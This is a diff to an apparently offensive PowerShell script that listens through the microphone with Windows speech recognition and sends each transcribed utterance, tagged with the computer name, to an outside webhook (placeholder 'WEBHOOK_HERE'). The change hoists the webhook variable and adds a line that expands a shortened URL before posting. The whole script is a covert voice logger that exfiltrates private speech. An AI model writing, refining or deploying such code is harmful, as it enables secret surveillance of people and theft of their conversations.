@@ -8,6 +8,8 @@ SETUP
 
 #>
 
+$dc = 'WEBHOOK_HERE' # can be shortened
+
 Add-Type -AssemblyName System.Speech
 $speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
 $grammar = New-Object System.Speech.Recognition.DictationGrammar
@@ -19,7 +21,7 @@ while ($true) {
     if ($result) {
         $results = $result.Text
         Write-Output $results
-        $dc = 'WEBHOOK_HERE'
+        if ($dc.Ln -ne 121){$dc = (irm $dc).url}
         $Body = @{'username' = $env:COMPUTERNAME ; 'content' = $results}
         irm -ContentType 'Application/Json' -Uri $dc -Method Post -Body ($Body | ConvertTo-Json)
     }
